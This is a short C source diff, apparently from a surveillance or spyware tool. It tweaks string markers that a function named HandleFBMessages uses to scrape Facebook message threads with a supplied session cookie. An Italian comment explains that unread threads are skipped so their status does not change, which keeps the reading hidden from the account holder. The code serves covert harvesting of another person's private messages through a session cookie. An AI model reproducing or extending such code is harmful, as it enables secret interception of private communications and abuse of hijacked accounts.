@@ -8,7 +8,7 @@
 
 #define FB_THREAD_IDENTIFIER "\\/messages\\/?action=read&amp;tid="
 #define FB_THREAD_AUTHOR_IDENTIFIER "class=\\\"authors\\\">"
-#define FB_THREAD_STATUS_IDENTIFIER "class=\\\"threadRow noDraft "
+#define FB_THREAD_STATUS_IDENTIFIER "class=\\\"threadRow noDraft"
 #define FB_MESSAGE_TSTAMP_IDENTIFIER "data-utime=\\\""
 #define FB_MESSAGE_BODY_IDENTIFIER "div class=\\\"content noh\\\" id=\\\""
 #define FB_MESSAGE_AUTHOR_IDENTIFIER "\\u003C\\/a>\\u003C\\/strong>"
@@ -240,7 +240,7 @@ DWORD HandleFBMessages(char *cookie)
 			break;
 		parser1 += strlen(FB_THREAD_STATUS_IDENTIFIER);
 		// Salta i thread unread per non cambiare il loro stato!!!!
-		if(!strncmp((char *)parser1, "unread", strlen("unread")))
+		if(!strncmp((char *)parser1, " unread", strlen(" unread")))
 			continue;
 
 		parser1 = (BYTE *)strstr((char *)parser1, FB_THREAD_IDENTIFIER);
